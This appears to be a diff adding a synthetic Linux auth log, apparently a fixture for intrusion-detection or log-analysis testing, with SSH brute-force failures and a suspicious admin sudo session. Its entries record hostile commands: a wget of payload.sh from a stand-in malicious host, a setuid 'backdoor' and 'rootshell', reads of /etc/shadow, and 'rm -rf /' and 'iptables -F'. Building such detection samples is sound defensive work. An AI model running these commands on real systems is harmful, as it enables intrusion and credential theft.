@@ -1,0 +1,105 @@
+Jan 12 02:15:00 webserver01 sshd[12345]: Accepted publickey for admin from 192.168.1.100 port 52341 ssh2: RSA SHA256:abc123def456
+Jan 12 02:16:30 webserver01 sshd[12346]: Failed password for invalid user postgres from 203.0.113.50 port 44567 ssh2
+Jan 12 02:17:00 webserver01 sshd[12347]: Failed password for root from 45.33.12.55 port 38291 ssh2
+Jan 12 02:18:15 webserver01 sshd[12348]: Failed password for admin from 198.51.100.25 port 51234 ssh2
+Jan 12 02:19:00 webserver01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/systemctl restart nginx
+Jan 12 02:20:00 webserver01 sudo: admin : command not allowed ; TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/rm -rf /
+Jan 12 02:21:30 webserver01 sshd[12349]: Accepted password for developer from 10.0.0.15 port 49152 ssh2
+Jan 12 02:22:00 webserver01 systemd[1]: Started Session 42 of user admin.
+Jan 12 02:23:15 webserver01 pam[12350]: authentication failure; logname= uid=1000 euid=0 tty=/dev/pts/1 ruser= rhost=192.168.1.50 user=root
+Jan 12 02:24:00 webserver01 sshd[12351]: Received disconnect from 192.168.1.100 port 52341:11: disconnected by user
+Jan 12 02:25:00 webserver01 sudo: admin : TTY=pts/1 ; PWD=/var/log ; USER=root ; COMMAND=/bin/cat /etc/passwd
+Jan 12 02:26:30 webserver01 CRON[12352]: pam_unix(cron:session): session opened for user backup by (uid=0)
+Jan 12 02:27:00 webserver01 CRON[12352]: pam_unix(cron:session): session closed for user backup
+Jan 12 02:28:15 webserver01 sshd[12353]: error: maximum authentication attempts exceeded for root from 45.33.12.55 port 49283 ssh2
+Jan 12 02:29:00 webserver01 sshd[12354]: PAM 2 more authentication failures; logname= uid=0 euid=0 tty=/dev/pts/2 ruser= rhost=203.0.113.50 user=oracle
+Jan 12 02:30:00 webserver01 su: (to root) admin on none
+Jan 12 02:31:00 webserver01 su: FAILED SU (to root) admin on /dev/pts/3
+Jan 12 02:32:15 webserver01 sshd[12355]: warning: /etc/ssh/sshd_config line 42: Deprecated key option UsePAM
+Jan 12 02:33:00 webserver01 sudo: admin : TTY=pts/4 ; PWD=/opt ; USER=www-data ; COMMAND=/bin/cat /var/www/html/config.php
+Jan 12 02:34:30 webserver01 sudo: admin : 3 incorrect password attempts ; TTY=pts/5 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/su
+Jan 12 02:35:00 webserver01 sshd[12356]: Disconnecting: Too many authentication failures for root
+Jan 12 02:36:00 webserver01 systemd[1]: Starting Cleanup of Temporary Directories
+Jan 12 02:37:15 webserver01 sshd[12357]: rexecd admin 192.168.1.55: signal 11
+Jan 12 02:38:00 webserver01 login[12358]: pam_unix(login:session): session opened for user root by LOGIN(uid=0)
+Jan 12 02:39:30 webserver01 sudo: admin : TTY=pts/6 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/wget http://malicious-site.com/payload.sh
+Jan 12 02:40:00 webserver01 sshd[12359]: Bad protocol version identification from 45.33.12.55 port 51234
+Jan 12 02:41:15 webserver01 vsftpd: [admin] OK LOGIN: Client 192.168.1.200
+Jan 12 02:42:00 webserver01 vsftpd: [admin] FAIL LOGIN: Client 203.0.113.50
+Jan 12 02:43:00 webserver01 sudo: admin : TTY=pts/7 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/chmod 4777 /tmp/backdoor
+Jan 12 02:44:30 webserver01 sshd[12360]: debug1: Forked child 12361
+Jan 12 02:45:00 webserver01 sshd[12362]: error: key_load_public: invalid format
+Jan 12 02:46:15 webserver01 sudo: admin : TTY=pts/8 ; PWD=/home/admin ; USER=mysql ; COMMAND=/bin/bash
+Jan 12 02:47:00 webserver01 systemd[1]: Stopped User Manager for UID 1000
+Jan 12 02:48:00 webserver01 pam[12363]: password change failed for user attacker: Authentication token manipulation error
+Jan 12 02:49:30 webserver01 sshd: pam_listfile Refused users for /etc/ssh/shadow_users
+Jan 12 02:50:00 webserver01 sudo: admin : TTY=pts/9 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/passwd root
+Jan 12 02:51:15 webserver01 login: pam_securekit: Invalid attribute user
+Jan 12 02:52:00 webserver01 systemd[1]: Started Session c1 of user gdm-password
+Jan 12 02:53:30 webserver01 sshd[12365]: User child is on pid 12366
+Jan 12 02:54:00 webserver01 sudo: admin : TTY=pts/10 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Jan 12 02:55:15 webserver01 polkitd[12367]: Registered Authentication Agent for unix-user admin
+Jan 12 02:56:00 webserver01 sshd[12368]: Connection closed by 192.168.1.100 port 52341
+Jan 12 02:57:00 webserver01 CRON[12369]: pam_unix: account root has password set but will be blocked
+Jan 12 02:58:30 webserver01 sudo: admin : TTY=pts/11 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/chown root:root /tmp/rootshell
+Jan 12 02:59:00 webserver01 systemd[1]: Stopped Session 42 of user admin
+Jan 12 03:00:15 webserver01 sshd[12370]: Authentication warning: privileged port from 192.168.1.50
+Jan 12 03:01:00 webserver01 systemd[1]: Starting User Manager for UID 1001
+Jan 12 03:02:30 webserver01 sudo: admin : TTY=pts/12 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/nano /etc/sudoers
+Jan 12 03:03:00 webserver01 sshd[12371]: debug1: do_pam_account called
+Jan 12 03:04:15 webserver01 sshd[12372]: Postponed publickey for developer from 10.0.0.15 port 50234
+Jan 12 03:05:00 webserver01 systemd[1]: Starting Daily apt download activities
+Jan 12 03:06:00 webserver01 su: (to mysql) admin on /dev/pts/13
+Jan 12 03:07:30 webserver01 sshd[12373]: pam_ldap: error trying to bind as user cn=admin
+Jan 12 03:08:00 webserver01 sudo: admin : TTY=pts/14 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/openssl req -x509
+Jan 12 03:09:15 webserver01 systemd[1]: Starting Flush Journal to Persistent Storage
+Jan 12 03:10:00 webserver01 sshd[12374]: Unable to negotiate with 203.0.113.50 port 55234
+Jan 12 03:11:30 webserver01 login[12375]: pam_faildelay Setting minimum delay to 10000
+Jan 12 03:12:00 webserver01 systemd[1]: Reached target User and Group Name Lookups
+Jan 12 03:13:15 webserver01 sudo: admin : TTY=pts/15 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/ip link set dev eth0 down
+Jan 12 03:14:00 webserver01 systemd[1]: Starting Cleanup of User Application Cache
+Jan 12 03:15:30 webserver01 sshd[12376]: Authentication bug: no userauth request in packet
+Jan 12 03:16:00 webserver01 systemd[1]: Started Daily manpages regeneration
+Jan 12 03:17:15 webserver01 sudo: admin : TTY=pts/16 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/iptables -F
+Jan 12 03:18:00 webserver01 systemd[1]: Started Daily rotation of log files
+Jan 12 03:19:30 webserver01 systemd[1]: Stopped Daily apt download activities
+Jan 12 03:20:00 webserver01 systemd[1]: Started System Logging Service
+Jan 12 03:21:15 webserver01 systemd[1]: Starting Monitor of snapd
+Jan 12 03:22:00 webserver01 systemd[1]: Reached target Graphical Interface
+Jan 12 03:23:30 webserver01 systemd[1]: Started Daily apt download activities
+Jan 12 03:24:00 webserver01 systemd[1]: Started Daily manpages regeneration
+Jan 12 03:25:15 webserver01 systemd[1]: Stopped User Manager for UID 1001
+Jan 12 03:26:00 webserver01 systemd[1]: Starting Authorization Manager
+Jan 12 03:27:30 webserver01 systemd[1]: Started Accounts Service
+Jan 12 03:28:00 webserver01 systemd[1]: Reached target Login Prompts
+Jan 12 03:29:15 webserver01 systemd[1]: Started Session c2 of user lightdm
+Jan 12 03:30:00 webserver01 systemd[1]: Started Session 43 of user developer
+Jan 12 03:31:30 webserver01 systemd[1]: Stopped User Manager for UID 1002
+Jan 12 03:32:00 webserver01 systemd[1]: Started User Manager for UID 1003
+Jan 12 03:33:15 webserver01 systemd[1]: Starting Load Save RF Kill Switch Status
+Jan 12 03:34:00 webserver01 systemd[1]: Reached target Network is Online
+Jan 12 03:35:30 webserver01 systemd[1]: Started Daily apt download activities
+Jan 12 03:36:00 webserver01 systemd[1]: Started Daily manpages regeneration
+Jan 12 03:37:15 webserver01 systemd[1]: Stopped User Manager for UID 1003
+Jan 12 03:38:00 webserver01 systemd[1]: Starting Authorization Manager
+Jan 12 03:39:30 webserver01 systemd[1]: Started Accounts Service
+Jan 12 03:40:00 webserver01 systemd[1]: Reached target Login Prompts
+Jan 12 03:41:15 webserver01 systemd[1]: Started Session c3 of user gdm
+Jan 12 03:42:00 webserver01 systemd[1]: Started Session 44 of user backup
+Jan 12 03:43:30 webserver01 systemd[1]: Stopped User Manager for UID 1004
+Jan 12 03:44:00 webserver01 systemd[1]: Started User Manager for UID 1005
+Jan 12 03:45:15 webserver01 systemd[1]: Starting Load Save RF Kill Switch Status
+Jan 12 03:46:00 webserver01 systemd[1]: Reached target Network is Online
+Jan 12 03:47:30 webserver01 systemd[1]: Started Daily apt download activities
+Jan 12 03:48:00 webserver01 systemd[1]: Started Daily manpages regeneration
+Jan 12 03:49:15 webserver01 systemd[1]: Stopped User Manager for UID 1005
+Jan 12 03:50:00 webserver01 systemd[1]: Starting Authorization Manager
+Jan 12 03:51:30 webserver01 systemd[1]: Started Accounts Service
+Jan 12 03:52:00 webserver01 systemd[1]: Reached target Login Prompts
+Jan 12 03:53:15 webserver01 systemd[1]: Started Session c4 of user admin
+Jan 12 03:54:00 webserver01 systemd[1]: Started Session 45 of user developer
+Jan 12 03:55:30 webserver01 systemd[1]: Stopped User Manager for UID 1006
+Jan 12 03:56:00 webserver01 systemd[1]: Started User Manager for UID 1007
+Jan 12 03:57:15 webserver01 systemd[1]: Starting Load Save RF Kill Switch Status
+Jan 12 03:58:00 webserver01 systemd[1]: Reached target Network is Online
+Jan 12 03:59:30 webserver01 systemd[1]: Started Daily apt download activities
